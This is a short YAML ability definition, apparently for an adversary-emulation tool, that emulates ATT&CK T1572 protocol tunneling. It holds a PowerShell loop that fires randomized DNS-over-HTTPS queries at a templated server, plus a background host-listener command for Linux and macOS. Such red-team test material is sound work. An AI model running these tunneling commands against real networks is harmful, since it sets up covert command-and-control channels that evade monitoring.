- id: edd2ad08-e1db-41d3-a793-9b7944aa5017
  name: Protocol Tunneling
  description: Ability for Protocol Tunneling (ATT&CK T1572). Generated from Atomic
    Red Team procedures; review and test safely before use.
  tactic: command-and-control
  technique:
    attack_id: T1572
    name: Protocol Tunneling
  platforms:
    windows:
      psh:
        command: 'for($i=0; $i -le #{query_volume}; $i++) { (Invoke-WebRequest "#{doh_server}?name=#{subdomain}.$(Get-Random
          -Minimum 1 -Maximum 999999).#{domain}&type=#{query_type}" -UseBasicParsing).Content
          }'
    linux:
      sh:
        command: '#{binary_path} host -p #{port} &'
    darwin:
      sh:
        command: '#{binary_path} host -p #{port} &'
